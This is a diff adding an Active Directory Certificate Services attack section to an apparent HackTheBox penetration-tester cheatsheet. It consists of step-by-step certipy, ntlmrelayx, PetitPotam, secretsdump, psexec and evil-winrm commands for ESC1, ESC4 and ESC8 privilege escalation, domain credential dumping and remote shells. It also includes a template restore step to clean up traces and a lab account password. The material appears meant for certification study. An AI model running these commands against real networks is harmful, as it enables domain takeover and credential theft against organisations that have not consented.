@@ -118,6 +118,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [whatweb](#whatweb)
 - [useful command](#useful-command)
 - [Step to privilege escalation in AD](#Step-to-privilege-escalation-in-AD)
+- [Attack Active Directory Certificate Services - AD CS](#Attack-Active-Directory-Certificate-Services---AD-CS)
 - [Useful Script To Local Windows Privilege Escalation](#Useful-Script-To-Local-Windows-Privilege-Escalation)
 - [Useful Resources To Local Windows Privilege Escalation](#Useful-Resources-To-Local-Windows-Privilege-Escalation)
 - [Useful Script To Linux Privilege Escalation](#Useful-Script-To-Linux-Privilege-Escalation)
@@ -3878,6 +3879,130 @@ impacket-secretsdump -k -no-pass 'resourced.local/Administrator@RESOURCEDC.resou
 
 # Use the Kerberos ticket straight to get the remote shell
 impacket-wmiexec -k -no-pass 'resourced.local/Administrator@RESOURCEDC.resourced.local'
+
+```
+## Attack Active Directory Certificate Services - AD CS
+```
+==================================================================================================================
+## 1. ESC1 - Enrollee Supplies Subject (user has enrollment rights on template with EnrolleeSuppliesSubject + Client Auth EKU
+==================================================================================================================
+# Scan for vulnerable templates
+certipy find -u USER@DOMAIN -p 'PASSWORD' -vulnerable -stdout -dc-ip <DC_IP>
+
+# Request cert impersonating Administrator
+certipy req -u USER@DOMAIN -p 'PASSWORD' -target <CA_HOSTNAME> -ca <CA_NAME> -template <TEMPLATE_NAME> -upn administrator@DOMAIN -dc-ip <DC_IP>
+or
+certipy req -u Jodie.Summers@nara-security.com -p 'hHO_S9gff7ehXw' -target 192.168.210.30 -dc-ip 192.168.210.30 -ca NARA-CA -template NaraUser -upn Administrator@nara-security.com
+
+# Bypass if error CRYPT_E_REVOCATION_OFFLINE: add CA hostname to /etc/hosts then use hostname in -target
+echo "<DC_IP> <CA_HOSTNAME>" | sudo tee -a /etc/hosts
+
+# Auth gets TGT + NTLM hash (if PKINIT supported)
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+
+# If PKINIT error → extract cert/key
+certipy cert -pfx administrator.pfx -nokey -out admin.crt
+certipy cert -pfx administrator.pfx -nocert -out admin.key
+or
+openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out admin.crt -nodes
+openssl pkcs12 -in administrator.pfx -nocerts -out admin.key -nodes
+
+# PassTheCert LDAP shell   (https://github.com/AlmondOffSec/PassTheCert)
+python3 passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain DOMAIN -dc-ip <DC_IP>
+# in ldap-shell: start_tls → change_password Administrator 'NewPass123!'
+
+# Shell with new password
+impacket-psexec administrator:'NewPass123!'@<DC_IP>
+evil-winrm -i <DC_IP> -u administrator -p 'NewPass123!'
+
+
+==================================================================================================================
+## 2. ESC4 - Template Hijacking (user has Write permissions on certificate template)
+## Condition: user/group has WriteOwner, WriteDacl, WriteProperty, or GenericWrite on the template
+## The user JODIE.SUMMERS@NARA-SECURITY.COM is a member of the group ENROLLMENT@NARA-SECURITY.COM.
+   The members of the group ENROLLMENT@NARA-SECURITY.COM have has the privileges to perform the ADCS ESC4 attack against the target domain.
+   Enrollment group as GenericAll on the NARAUSER template
+==================================================================================================================
+
+# Scan for vulnerable templates
+certipy find -u USER@DOMAIN -p 'PASSWORD' -vulnerable -stdout -dc-ip <DC_IP>
+
+# Modify template → turn on ESC1 conditions (certipy automatically backs up before editing)
+certipy template -u USER@DOMAIN -p 'PASSWORD' -template <TEMPLATE_NAME> -dc-ip <DC_IP>
+or
+certipy template -u Jodie.Summers@nara-security.com -p 'hHO_S9gff7ehXw' -template NaraUser -dc-ip 192.168.210.30
+
+# Request cert impersonating Administrator (after template has been modified)
+certipy req -u USER@DOMAIN -p 'PASSWORD' -target <CA_HOSTNAME> -ca <CA_NAME> -template <TEMPLATE_NAME> -upn administrator@DOMAIN -dc-ip <DC_IP>
+
+# Bypass CRYPT_E_REVOCATION_OFFLINE: add CA hostname to /etc/hosts then use hostname in -target
+echo "<DC_IP> <CA_HOSTNAME>" | sudo tee -a /etc/hosts
+
+# Restore the template to the old one (clean up traces, use the backup file certipy created)
+certipy template -u USER@DOMAIN -p 'PASSWORD' -template <TEMPLATE_NAME> -dc-ip <DC_IP> -configuration <TEMPLATE_NAME>.json
+
+# Auth gets TGT + NTLM hash (if PKINIT supported)
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+
+# If PKINIT error (KDC_ERR_PADATA_TYPE_NOSUPP) → extract cert/key
+certipy cert -pfx administrator.pfx -nokey -out admin.crt
+certipy cert -pfx administrator.pfx -nocert -out admin.key
+or
+openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out admin.crt -nodes
+openssl pkcs12 -in administrator.pfx -nocerts -out admin.key -nodes
+
+# PassTheCert LDAP shell
+python3 passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain DOMAIN -dc-ip <DC_IP>
+# in ldap-shell: start_tls → change_password Administrator 'NewPass123!'
+
+# Shell with new password
+impacket-psexec administrator:'NewPass123!'@<DC_IP>
+evil-winrm -i <DC_IP> -u administrator -p 'NewPass123!'
+
+
+==================================================================================================================
+## ESC8 - NTLM Relay to AD CS Web Enrollment
+## Conditions: CA has HTTP Web Enrollment endpoint enabled, no EPA (Extended Protection for Authentication)
+## Goal: Relay NTLM auth of DC machine account → get DC$ cert → DCSync
+==================================================================================================================
+# Scan for CA with Web Enrollment (look for Enabled: True in HTTP/HTTPS Web Enrollment)
+certipy find -u USER@DOMAIN -p 'PASSWORD' -vulnerable -stdout -dc-ip <DC_IP>
+
+# Step 1: Setup NTLM relay targeting the Web Enrollment endpoint
+impacket-ntlmrelayx -t http://<CA_HOSTNAME>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+# Step 2: Trigger NTLM auth from DC machine account (run in parallel with step 1)
+# Option A: PetitPotam (no cred required)
+python3 PetitPotam.py -d DOMAIN <ATTACKER_IP> <DC_IP>
+# Option B: Coercer
+coercer coerce -u USER -p 'PASSWORD' -d DOMAIN -l <ATTACKER_IP> -t <DC_IP>
+
+# Step 3: ntlmrelayx automatically relay → get DC$ cert (save as base64)
+# The cert will appear in the base64 output of ntlmrelayx
+
+# Step 4: Convert base64 cert to pfx
+echo "<BASE64_CERT>" | base64 -d > dc.pfx
+
+# Auth gets TGT + NTLM hash of DC$ (if PKINIT supported)
+certipy auth -pfx dc.pfx -dc-ip <DC_IP>
+
+# If PKINIT error → extract cert/key then use PassTheCert
+certipy cert -pfx dc.pfx -nokey -out dc.crt
+certipy cert -pfx dc.pfx -nocert -out dc.key
+python3 passthecert.py -action ldap-shell -crt dc.crt -key dc.key -domain DOMAIN -dc-ip <DC_IP>
+# in ldap-shell: start_tls → change_password Administrator 'NewPass123!'
+
+# Use NTLM hash of DC$ to DCSync dump the entire domain
+KRB5CCNAME=dc.ccache impacket-secretsdump -k <DC_HOSTNAME>
+# or use hash directly
+impacket-secretsdump -hashes :<DC_NTLM_HASH> 'DOMAIN/DC$'@<DC_IP>
+
+# Shell with Administrator hash
+impacket-psexec -hashes :<ADMIN_NTLM_HASH> administrator@<DC_IP>
+evil-winrm -i <DC_IP> -u administrator -H <ADMIN_NTLM_HASH>
+
+
+
 
 
 ```
